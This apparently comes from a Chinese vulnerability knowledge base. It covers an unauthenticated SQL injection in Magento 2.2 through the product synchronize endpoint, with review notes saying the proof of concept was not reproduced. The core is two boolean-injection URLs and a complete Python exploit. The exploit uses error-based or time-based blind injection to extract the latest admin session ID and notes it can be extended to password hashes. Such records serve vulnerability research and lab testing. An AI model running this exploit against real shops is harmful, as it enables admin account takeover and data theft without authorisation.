---
source: "hatch 补库批 20260928"
product: "Magento2.2.0–2.3.0 per script"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Magento 2.2 SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：public synchronize source since2.2.0; from/to sink; active DB admin session needed only account takeover"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-dac1d6f2b7f3d0035bc979ee"
entity_id: "ve-dac1d6f2b7f3d0035bc979ee"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：public synchronize source since2.2.0; from/to sink; active DB admin session needed only account takeover

- **结论使用边界（1）**：标题/影响仅2.2而脚本2.2.0&lt;=2.3.0，应分测试与范围；Magento1.x sink存在不等于此入口适用。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：正文BOOL实为错误状态布尔侧信道，脚本同时time备选，准确保留。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：session_timeout900/26字符小写数字/表名无前缀硬编码，取session不等于可登录，缺会话绑定条件。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **事实待核（4）**：1秒延时阈值无基线易噪声；测试请求没有超时；原作者/source有保留但CVE未给。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Magento 2.2 SQL注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Magento 2.2

三、复现过程
------------

    http://www.0-sec.org:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
    http://www.0-sec.org:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-

可见，在执行`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -`和`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`时，返回的HTTP状态码不同：

![2.png](./.resource/Magento2.2SQL注入漏洞/media/rId24.png)![3.png](./.resource/Magento2.2SQL注入漏洞/media/rId25.png)

通过改变OR的条件，即可实现SQL BOOL型盲注。

利用POC，可以读取管理员的session：

![4.png](./.resource/Magento2.2SQL注入漏洞/media/rId26.png)

    #!/usr/bin/env python3
    # Magento 2.2.0 <= 2.3.0 Unauthenticated SQLi
    # Charles Fol
    # 2019-03-22
    #
    # SOURCE & SINK
    # The sink (from-to SQL condition) has been present from Magento 1.x onwards.
    # The source (/catalog/product_frontend_action/synchronize) from 2.2.0.
    # If your target runs Magento < 2.2.0, you need to find another source.
    #
    # SQL INJECTION
    # The exploit can easily be modified to obtain other stuff from the DB, for
    # instance admin/user password hashes.
    #

    import requests
    import string
    import binascii
    import re
    import random
    import time
    import sys
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    def run(url):
        sqli = SQLInjection(url)

        try:
            sqli.find_test_method()
            sid = sqli.get_most_recent_session()
        except ExploitError as e:
            print('Error: %s' % e)


    def random_string(n=8):
        return ''.join(random.choice(string.ascii_letters) for _ in range(n))


    class ExploitError(Exception):
        pass


    class Browser:
        """Basic browser functionality along w/ URLs and payloads.
        """
        PROXY = None

        def __init__(self, URL):
            self.URL = URL
            self.s = requests.Session()
            self.s.verify = False
            if self.PROXY:
                self.s.proxies = {
                    'http': self.PROXY,
                    'https': self.PROXY,
                }


    class SQLInjection(Browser):
        """SQL injection stuff.
        """

        def encode(self, string):
            return '0x' + binascii.b2a_hex(string.encode()).decode()

        def find_test_method(self):
            """Tries to inject using an error-based technique, or falls back to timebased.
            """
            for test_method in (self.test_error, self.test_timebased):
                if test_method('123=123') and not test_method('123=124'):
                    self.test = test_method
                    break
            else:
                raise ExploitError('Test SQL injections failed, not vulnerable ?')

        def test_timebased(self, condition):
            """Runs a test. A valid condition results in a sleep of 1 second.
            """
            payload = '))) OR (SELECT*FROM (SELECT SLEEP((%s)))a)=1 -- -' % condition
            r = self.s.get(
                self.URL + '/catalog/product_frontend_action/synchronize',
                params={
                    'type_id': 'recently_products',
                    'ids[0][added_at]': '',
                    'ids[0][product_id][from]': '?',
                    'ids[0][product_id][to]': payload
                }
            )
            return r.elapsed.total_seconds() > 1

        def test_error(self, condition):
            """Runs a test. An invalid condition results in an SQL error.
            """
            payload = '))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE %s) -- -' % condition
            r = self.s.get(
                self.URL + '/catalog/product_frontend_action/synchronize',
                params={
                    'type_id': 'recently_products',
                    'ids[0][added_at]': '',
                    'ids[0][product_id][from]': '?',
                    'ids[0][product_id][to]': payload
                }
            )
            if r.status_code not in (200, 400):
                raise ExploitError(
                    'SQL injection does not yield a correct HTTP response'
                )
            return r.status_code == 400

        def word(self, name, sql, size=None, charset=None):
            """Dichotomically obtains a value.
            """
            pattern = 'LOCATE(SUBSTR((%s),%d,1),BINARY %s)=0'
            full = ''

            check = False
            
            if size is None:
                # Yeah whatever
                size_size = self.word(
                    name,
                    'LENGTH(LENGTH(%s))' % sql,
                    size=1,
                    charset=string.digits
                )
                size = self.word(
                    name,
                    'LENGTH(%s)' % sql,
                    size=int(size_size),
                    charset=string.digits
                )
                size = int(size)

            print("%s: %s" % (name, full), end='\r')

            for p in range(size):
                c = charset
                
                while len(c) > 1:
                    middle = len(c) // 2
                    h0, h1 = c[:middle], c[middle:]
                    condition = pattern % (sql, p+1, self.encode(h0))
                    c = h1 if self.test(condition) else h0

                full += c
                print("%s: %s" % (name, full), end='\r')

            print(' ' * len("%s: %s" % (name, full)), end='\r')

            return full

        def get_most_recent_session(self):
            """Grabs the last created session. We don't need special privileges aside from creating a product so any session
            should do. Otherwise, the process can be improved by grabbing each session one by one and trying to reach the
            backend.
            """
            # This is the default admin session timeout
            session_timeout = 900
            query = (
                'SELECT %%s FROM admin_user_session '
                'WHERE TIMESTAMPDIFF(SECOND, updated_at, NOW()) BETWEEN 0 AND %d '
                'ORDER BY created_at DESC, updated_at DESC LIMIT 1'
            ) % session_timeout

            # Check if a session is available

            available = not self.test('(%s)=0' % (query % 'COUNT(*)'))
            
            if not available:
                raise ExploitError('No session is available')
            print('An admin session is available !')

            # Fetch it

            sid = self.word(
                'Session ID',
                query % 'session_id',
                charset=string.ascii_lowercase + string.digits,
                size=26
            )
            print('Session ID: %s' % sid)
            return sid

    run(sys.argv[1])

参考链接
--------

> https://vulhub.org/\#/environments/magento/2.2-sqli/
